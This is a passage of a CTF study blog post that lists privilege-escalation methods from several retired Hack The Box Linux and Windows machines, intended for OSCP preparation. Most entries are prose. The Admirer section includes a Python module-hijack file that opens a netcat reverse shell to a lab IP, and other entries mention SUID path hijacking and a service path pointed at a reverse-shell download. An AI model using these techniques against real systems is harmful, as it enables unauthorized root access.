# hack the box learning

https://infinitelogins.com/2020/12/12/list-of-privilege-escalation-methods-on-hack-the-box-machines/


List of Privilege Escalation Methods on Hack The Box Machines
Posted on December 12, 2020 by Harley in Hack The Box
This post will contain a list of retired Hack The Box machines and the methods used by Ippsec to escalate privileges. The idea is to provide a list of privesc methods to review when you’re stuck and unable to find the intended way to escalate when you’re taking the OSCP exam and/or participating in a CTF.

This list will be updated as time goes on.

Linux Machines:
OpenAdmin: Linux Machine Retired in May 2020

Ippsec was able to abuse a public exploit to get command execution as www-data. This allowed for a low-privileged reverse shell.
Once on the box as www-data, he was able to enumerate the config files for the webserver, and found plaintext credentials for the SQL database.
Connecting to the SQL database didn’t return anything new, but we were able to enumerate additional users on the box from /etc/passwd, and found that the credentials to the database were being reused for the Jimmy user account.
We also found that an additional webserver was listening on localhost port 52846 by running ss -lntp.
Reviewing the configuration files that power this webserver reveals a SHA256 hash that we’re able to decrypt the cleartext password to. This reveals Johanna’s SSH key, which we then can leverage John to crack the encryption on. Finally, we’re able to SSH into the box as Johanna.
After using SSH to login as Johanna, we found that the Nano binary had its SUID bit set. Using GTFObins allowed for a way to escape and escalate to root.
Admirer: Linux Machine Retired in September 2020

We’re able to find credentials for a user named Waldo, which allows us to SSH into the box.
From here, we run sudo -l and find that he’s able to write to run the following as sudo. /opt/scripts/admin_tasks.sh
Reviewing the code of admin_tasks.sh, we find that it calls on another script when performing a web backup. That script is /opt/scripts/backup.py.
It doesn’t look like we have a way to pass any parameters, but the script imports a Python module with the following line: from shutil import make_archive
This means that we can create our own shutil.py file, provide the path when we execute the parent script, and should be able to execute Python code as root. We start by making a file at /opt/a/shutil.py with the following code:
import os
def make_archive(a, b, c):
os.system('nc 10.10.14.44 443 -e "/bin/sh"')
Then finally we can start a netcat listener, and run the script as sudo while passing the PYTHONPATH variable to our custom location.
sudo PYTHONPATH=/tmp/a /opt/scripts/admin_tasks.sh
Magic: Linux Machine Retired in Aug 2020

Ippsec was able to gain a low-privileged shell by using a SQL injection to bypass the initial login page, and then uploading a malicious PHP web-shell. This gets us on the box as www-data.
Looking through the website configuration files, we find that the credentials for a user are stored in plaintext. These are used to connect to a local database.
Dumping the contents of this database using the captured credentials reveals another set of credentials for a new user, named Theseus.
We find that the password taken from the database works to switch over to the Thesues user in Linux.
Now we restart our enumeration and end up running commands to see what files we have write permissions to.
find / -user theseus -ls 2>/dev/null
find / -group users -ls 2>/dev/null
This returns a binary with the SUID bit set: /bin/sysinfo
Running strace against this shows that it will use the binary called free, but it doesn’t use an absolute path. This allows us to create our own free binary, update our path so that our custom free binary gets executed instead.
Now running the sysinfo binary will call upon our custom free binary in the root context, therefor giving us a root reverse shell.
Windows Machines:
Chatterbox: Windows Machine Retired in June 2018

You’re able to get an initial shell by using a public BOF exploit. This will get a shell as Alfred.
Once on the box, you find that you’re able to read the Administrator’s Desktop, but you can’t read the root.txt file.
Using acals, we find that we have Full Control of the desktop, which means we can grant ourselves access to root.txt with the following command: icacls root.txt /grant alfred:F
We also find that there are autologin creds stored in cleartext. These creds are for the Alfred user, but we’re able to actually reuse the same password for the Administrator account using PowerShell to gain a reverse shell as Admin.
SecNotes: Windows Machine Retired in January 2019

Ippsec was able to gain a low-privileged shell as a user named Tyler. Inside Tyler’s Desktop directory was a link to a file named bash.lnk. This was a hint that Bash for Windows was installed. Because of this, he was able to look through the appdata for the installed application, find the filesystem used by the virtual machine container, and open the contents of the root users’ .bash_history file. Within this was the local administrator credential to the box in plaintext.

Bastion: Windows Machine Retired in Sep 2019

Ippsec was able to gain a low-privileged shell as a user named L4mpje. Eventually he came across the Program Files (x86) directory that showed an application called mRemoteNG was installed. This stood out because all other applications appeared to be pretty default. Doing a Google search on “mRemoteNG password decrypt” returned a handful of articles showing how you could extract hashes from the config file of this application using tools on Github. Doing this allowed us to gather the local admin user credentials.

ServMon: Windows Machine Retired in June 2020

Ippsec was able to find cleartext creds via LFI and use those to SSH into the box as a low-privileged user named Nadine. Enumerating the box confirmed that an application called NSClient was running, which appears execute remote commands/scripts based on what jobs you schedule in the webapp. Using a command that uses the nsclient.exe binary, we were able to extract the password to login to the admin of this application in cleartext. We set up an SSH tunnel so that we can access the web interface as localhost, sign in with this captured password, and then schedule a job that executes our malicious PowerShell command.

Remote: Windows Machine Retired in Sept 2020

Ippsec was able to get a low-level shell by abusing a public exploit for the CMS powering the site.
Running whoami /all showed that SeImpersonatePrivilege was enabled, which allow for a Potato-based attack.
WinPEAS output helps us determine that we can modify UsoSvc service, along with start it.
Using sc.exe, we’re able to modify the binary path used by this service to instead launch the following command: cmd.exe /c powershell.exe -EncodedCommand <encodedCommand>
The encoded command was configured to download a reverse shell and execute it into memory, which then allowed escalation to SYSTEM.
Buff: Windows Machine Retired in Nov 2020

Ippsec was able to gain a low-privileged shell as a user named Shaun. He ran the WinPEAS script and spoke about a few items that stood out. First, he saw that Watson returned a handful of CVEs related to Windows Build version, but he said he’ll save those for last due to stability issues with those type of exploits. Next, he points out that an administrator is currently logged in, so he suggests we look at processes running as administrator currently. He found that SQL was running so we may want to poke around in that. We can write into the c:\xampp directory, so that’s interesting. After this script finished, he started enumerating the box and came across “Tasks.bat” within his Documents directory, which executes a file that starts the webserver. In Downloads, he finds a “CloudMe_1112.exe” file. Running searchsploit against this returns a handful of BOF vulnerabilities. Exploiting this returns a reverse shell running as administrator.


# ENumeration cheatsheets

https://infinitelogins.com/enumeration-cheatsheets/


